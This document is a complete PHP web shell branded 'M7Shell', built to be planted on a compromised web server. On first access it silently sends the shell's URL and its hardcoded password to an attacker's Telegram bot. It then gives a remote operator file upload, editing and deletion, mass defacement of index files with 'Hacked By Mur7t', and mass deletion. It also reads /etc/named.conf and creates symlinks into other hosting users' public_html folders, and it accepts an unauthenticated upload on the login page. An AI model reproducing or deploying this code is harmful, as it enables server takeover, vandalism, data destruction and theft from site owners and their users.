<?php
 error_reporting(0);
 set_time_limit(0);
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
 ini_set('memory_limit', '64M');
 header('Content-Type: text/html; charset=UTF-8');

 session_start();
 $auth="muryedite"; 	//("Shell Sifresi");
 function serverip(){
 	$ip1=$_SERVER['SERVER_ADDR'];
 	$ip2=gethostbyname($_SERVER['HTTP_HOST']);
 	if($ip1 == $ip2){
 		return $ip1;
 	}else{
 		return $ip2;
 	}
 }
if (!$_COOKIE['m']) {
  $urla = 'http://'.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
      file_get_contents("https://api.telegram.org/bot7923281155:AAExM8h8-h8VFNaW7RnOEYnk8K2l9mXfmyM/sendMessage?chat_id=1198045063&text=Başarılı! = ".$urla." Şifre = ".$auth." ");
      setcookie("m","a");
}
 function login(){
    global $auth;
    echo "<title>M7T</title>
    <center><br><b>Pass:</b>
    <form action='' method='POST'>
    <input type='username' name='minim_pass' placeholder=' '>
    </form>";
    if(isset($_POST['minim_pass'])){
        if($_POST['minim_pass'] == $auth){
            $_SESSION['admin'] = "TRUE";
            pindah('?home');
        }else{
            alert('W R O N G');
            pindah('?PAHAHAA');
        }
    }
}
 function write($content,$dir){
 	$fh=fopen($dir,"w");
 	if(fwrite($fh,$content)){
 		return "1";
 	}else{
 		return "0";
 	}
 	fclose($fh);
 }
function author(){
	print "</table><center><br><br><h3><a href='https://t.me/konusartik'>M U R 7 T</a><br><b></b></h3><br><br>";
}
function delTree($dir){ 
$files = array_diff(scandir($dir), array('.', '..')); 
	foreach ($files as $file) { 
		(is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file"); 
	}
	return rmdir($dir);
} 
function alert($msg){
	print "<script>alert('".$msg."');</script>";
}
function pindah($dir){
	print "<script>window.location='".$dir."';</script>";
}
if($_SESSION['admin'] == "TRUE"){
echo "<title>- M7T -</title>
<style>
@import url('https://fonts.googleapis.com/css?family=Supermercado+One');
* {margin: 0; padding: 0}
#wrapper {
    margin: auto;
    padding: 10px;
}
body {
    background: #D7DACC;
}
table td{
	padding: 8px 8px;
}
h1 {
    text-align: center;
}

.text {
    position: relative;
    display: inline-block;
    font-size: 2rem;
    text-transform: uppercase;
    color: #d80404;
    text-shadow: 2px 2px 0px #6363637c, 5px 5px 0px rgba(0, 0, 0, 0.1);
}
tr:hover{
background-color: #18246398;
text-shadow:0px 0px 10px #339900;
}


</style>
<style>
.text a{
	color:#d80404;
	text-decoration:none;
}
.text a:hover{
	color:white;
}
a{
	color:white;
	text-decoration:none;
}
a:hover{
	color:#d80404;
}
#menu a{
        padding:7px 29px;
        margin:0;
        background:#222222;
        text-decoration:none;
        letter-spacing:1px;
        -moz-border-radius: 5px; -webkit-border-radius: 5px;
 -khtml-border-radius: 5px; border-radius: 5px;
}
#menu a:hover{
	background:#191919;
 color: red;
 border-bottom:1px solid #333333;
 border-top:1px solid #333333;
 text-decoration: none;
}
</style>
<style>
		body {
			background-color: #080c24;
			background-size: 100% 100%;
			}
	</style>
<!--<body bgcolor='green'>-->
<font color='white'>
<link href='https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css' rel='stylesheet' type='text/css'>
<center>";
$dir=$_GET['dir'];
if(!$dir){
	$dir=getcwd();
}
echo "<div id='wrapper'>
        <h1 class='text'><a href='https://t.me/konusartik'>M7Shell</a></h1>
    </div>
    <hr width='30%'>
    <br><br>
</center>
<i class='fa fa-hdd-o'></i> ".php_uname()."<br>
<i class='fa fa-desktop'></i> ".serverip()." | <i class='fa fa-user'></i> ".$_SERVER['REMOTE_ADDR']."<br>
<i class='fa fa-folder-o'></i> ";
$a=explode("/",$dir);
foreach($a as $aa => $aaa){
	if($aaa == '' && $aa == '0'){
		echo "<a href='?dir=/'>/</a>";
		continue;
	}elseif($aaa == ''){
		continue;
	}else{
		echo "<a href='?dir=";
		for($i=0;$i<=$aa;$i++){
			echo $a[$i]."/";
		}
		echo "'>$aaa</a>/";
	}
}
echo "<br><br>
<a href='?home'>Home</a> | <a href='?nf&dir=$dir'>+ File</a> | <a href='?nd&dir=$dir'>+ Dir</a> | <a href='?exit'>Exit</a><br><br>";


$files = $_FILES['vulnfile']['name'];
	$dest = $dir.'/'.$files;
	if(isset($_POST['upload'])) {
	    if(is_writable($root)) {
	        if(@copy($_FILES['vulnfile']['tmp_name'], $dest)) {
	            $web = "http://".$_SERVER['HTTP_HOST']."/";
	            echo "<h style='color: green;'> Upload Successful</h>";
	        } else {
	            echo "<h style='color: green;'> Upload Failed</h>";
	        }
	    } else {
	        if(@copy($_FILES['vulnfile']['tmp_name'], $dest)) {
	            echo "<h style='color: green;'> Upload Successful</h>";
	        } else {
	            echo "<h style='color: green;'> Upload Failed</h>";
	        }
	    }
	}



if(isset($_GET['nf'])){
	echo "
	<form action='?nf&dir=$dir' method='POST'>
	New File : <input type='text' name='fname'>
	<input type='submit' name='fok' value='Done'>
	</form>";
	if($_POST['fok']){
		pindah("?edit=$dir/".$_POST['fname']."&dir=$dir");
	}
}elseif(isset($_GET['nd'])){
	echo "
	<form action='?nd&dir=$dir' method='POST'>
	New Dir : <input type='text' name='fname'>
	<input type='submit' name='fok' value='Done'>
	</form>";
	if($_POST['fok']){
		if(mkdir("$dir/".$_POST['fname']."")){
			echo "successfully created";
		}else{
			echo "Failed";
		}

	}
}elseif(isset($_GET['delf'])){
	if(delTree($_GET['delf'])){
		pindah("?dir=$dir");
	}else{
		alert('Failed.');
	}
}elseif(isset($_GET['renf'])){
	$now=$_GET['renf'];
	echo "
	<form action='?renf=$now&dir=$dir' method='POST'>
	New Name : <input type='text' name='fname'>
	<input type='submit' name='fok' value='Done'>
	</form>";
	if(isset($_POST['fok'])){
		$new=$_POST['fname'];
		if(rename($now,"$dir/$new")){
			echo "<center>Rename Successfully<center>";
		}else{
			echo "<center>Rename Failed<center><center>";
		}
	}
}elseif(isset($_GET['del'])){
	if(unlink($_GET['del'])){
		echo "<center>Delete Successfully</center>";
	}else{
		echo "<center>Delete Failed</center>";

	}
}elseif(isset($_GET['exit'])){
	session_destroy();
	pindah('?home');
}elseif(isset($_GET['edit'])){
	$save=$_GET['edit'];
	$cont=htmlspecialchars(file_get_contents($save));
	echo "<form action='?edit=$save&$dir=$dir' method='POST'>
	<center><textarea name='fcont' cols=100% rows=30%>$cont</textarea><br><br>
	<input type='submit' name='FakesiteGans' value='        [ Save File ]        '></center>
	</form><br><br>";
	author();
	if(isset($_POST['FakesiteGans'])){
		if(write($_POST['fcont'],$save) == "1"){
			echo "<h3>Edit Successfully</h3>";
			alert('Edit Successfully.');
		}else{
			alert('Failed.');
			echo('Failed.');
		}
	}
}elseif($_GET['mass'] == 'deface'){
	function mass_kabeh($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=#18BC9C>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = mass_kabeh($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function mass_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=#18BC9C>DONE</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe'] == 'massal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			mass_kabeh($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe'] == 'biasa') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			mass_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
		echo "<a href='?'><- kembali</a>";
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Type:</font><br>
	<input type='radio' name='tipe' value='biasa' checked>Normal<input type='radio' name='tipe' value='massal'>Multi<br><br>
	<font style='text-decoration: underline;'>Dir:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Mur7t</textarea><br>
	<input type='submit' name='start' value='Start!' style='width: 450px;' class='btn btn-success btn-sm'>
	</form>";

	}
}elseif($_GET['mass'] == 'delete') {
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=#18BC9C>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		hapus_massal($_POST['d_dir'], $_POST['d_file']);
		echo "</div>";
		echo "<a href='?'><- kembali</a>";
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Dir:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<input type='submit' name='start' value='Start!' style='width: 450px;'>
	</form>";
	}
}elseif(isset($_GET['sym'])) {
	if (!is_file('named.txt')) {
				
				$d00m = @file("/etc/named.conf");
				
			} else {
				
				$d00m = @file("named.txt");
				
				
			}
			if (!$d00m) {
				
				die("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
			} else {
				echo "<center><div class='tmp'><table align='center' width='40%' bgcolor='white'><td>Domains</td><td>Users</td><td>symlink </td>";
				foreach ($d00m as $dom) {
					
					if (eregi("zone", $dom)) {
						
						preg_match_all('#zone "(.*)"#', $dom, $domsws);
						
						flush();
						
						if (strlen(trim($domsws[1][0])) > 2) {
							
							$user = posix_getpwuid(@fileowner("/etc/valiases/" . $domsws[1][0]));
							
							flush();
							
							
							
							$site = $user['name'];
							
							
							@symlink("/", "sym/root");
							
							$site = $domsws[1][0];
							
							$ir = 'ir';
							
							$il = 'il';
							
							if (preg_match("/.^$ir/", $domsws[1][0]) or preg_match("/.^$il/", $domsws[1][0])) {
								$site = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>" . $domsws[1][0] . "</div>";
							}
							
							
							echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://www." . $domsws[1][0] . "/>" . $site . " </a> </div>
</td>


<td>
" . $user['name'] . "
</td>






<td>
<a href='sym/root/home/" . $user['name'] . "/public_html' target='_blank'>symlink </a>
</td>


</tr></div> </center>";
							
							
							flush();
							flush();
							
						}
					}
				}
			}
			
			


}elseif(isset($_GET['src'])){
	$cont=$_GET['src'];
	print "<div style='background-color: red;'><pre>".htmlspecialchars(file_get_contents($cont))."</pre></div>";
}else{
/* Form file upload*/
echo "<form method='post' enctype='multipart/form-data'>
	      <input type='file' name='vulnfile' style='border: 1.5px solid rgba(255, 255, 255, 0.842)'>
	      <input type='submit' name='upload' value='upload now!'>
	      </form><br>";
echo "<center>
<div id='menu'>
  <a href='?mass=deface'>Mass Deface</a>
  <a href='?mass=delete'>Mass Delete</a>
  <a href='?sym'>[ User & Domains & Symlink ]</a>
</div></center><br>
<table bgcolor='black' width='100%' style='color:red;' border='4' cellpadding='3' cellspacing='1' align='center'>
<tr>
<th width=50%>Name</th>
<th width=30%>Type / Size</th>
<th width=20%>Action</th>
</tr>";
$s=scandir($dir);
foreach($s as $fol){
	if($fol == "."){
		continue;
	}elseif($fol == ".."){
		print "<tr><td><i class='fa fa-folder-o'></i> <a href='?dir=$dir/$fol/'>$fol</a></td><td></td><tr>";
	}else{
		if(is_dir("$dir/$fol") == TRUE){
			print "<tr><td><i class='fa fa-folder-o'></i> <a href='?dir=$dir/$fol/'>$fol</a></td><center><td>Folder</td></center><td><a href='?delf=$dir$fol/&dir=$dir'><center>Delete</a> | <a href='?renf=$dir$fol/&dir=$dir'>Rename</a></center></td><tr>";
	}
}
}
foreach($s as $file){
	if($file == "." || $file == ".."){
		continue;
	}else{
		  $size=filesize("$dir/$file")/1024;
		  $size = round($size,3);
		  if($size >= 1024){
    	  	$size = round($size/1024,2).' MB';
    	  }else{
  			$size = $size.' KB';
  		}if(is_file("$dir/$file") == TRUE){
			print "<tr><td><i class='fa fa-file-o'></i> <a href='?src=$dir/$file&dir=$dir'>$file</a></td><td>$size</td><td><center><a href='?edit=$dir/$file&dir=$dir'>Edit</a> | <a href='?del=$dir/$file&dir=$dir'>Delete</a> | <a href='?renf=$dir/$file&dir=$dir'>Rename</a></td></tr></center>";
	}
}
}
  author();
}
}else{
	login();
	$name=$_FILES['s']['name'];
	$tmp=$_FILES['s']['tmp_name'];
	if(copy($tmp,$name)){}else{
		print "M7T";
	}
}
?>
